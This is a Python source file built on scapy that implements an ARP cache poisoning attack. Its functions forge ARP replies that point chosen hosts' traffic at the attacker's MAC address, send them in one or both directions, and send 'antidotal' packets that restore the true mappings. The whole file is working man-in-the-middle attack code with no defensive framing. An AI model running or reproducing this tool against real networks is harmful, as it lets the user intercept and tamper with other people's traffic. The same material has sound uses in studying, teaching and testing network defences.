from dataclasses import dataclass
from scapy.all import *
from util import Host, Interface

@dataclass
class ARPAttackSettings:
    interface: Interface
    sources: list[Host]
    destinations: list[Host]
    two_way: bool
    initial_packets: int
    seconds_interval: int

    @property
    def me(self):
        return Host(
            self.interface.ip_addr,
            self.interface.mac_addr
        )

def construct_poisonous_packet(me: Host, source: Host, destination: Host):
    packet = Ether() / ARP()
    packet[Ether].src = me.mac_addr
    packet[Ether].dst = source.mac_addr
    packet[ARP].psrc = destination.ip_addr
    packet[ARP].pdst = source.ip_addr
    packet[ARP].hwsrc = me.mac_addr
    packet[ARP].hwdst = source.mac_addr

    return packet

def construct_antidotal_packet(me: Host, source: Host, destination: Host):
    packet = Ether() / ARP()
    packet[Ether].src = me.mac_addr
    packet[Ether].dst = source.mac_addr
    packet[ARP].psrc = destination.ip_addr
    packet[ARP].pdst = source.ip_addr
    packet[ARP].hwsrc = destination.mac_addr
    packet[ARP].hwdst = source.mac_addr

    return packet

def send_poisonous_packets(settings: ARPAttackSettings):
    pairs = [(x, y) for x in settings.sources for y in settings.destinations if x != y]

    for source, destination in pairs:
        sendp(
            construct_poisonous_packet(settings.me, source, destination),
            iface=settings.interface.name,
            verbose=0)
        
        if settings.two_way:
            sendp(
                construct_poisonous_packet(settings.me, destination, source),
                iface=settings.interface.name,
                verbose=0)

def send_antidotal_packets(settings: ARPAttackSettings):
    pairs = [(x, y) for x in settings.sources for y in settings.destinations if x != y]

    for source, destination in pairs:
        sendp(
            construct_antidotal_packet(settings.me, source, destination),
            iface=settings.interface.name,
            verbose=0)

        if settings.two_way:
            sendp(
                construct_antidotal_packet(settings.me, destination, source),
                iface=settings.interface.name,
                verbose=0)
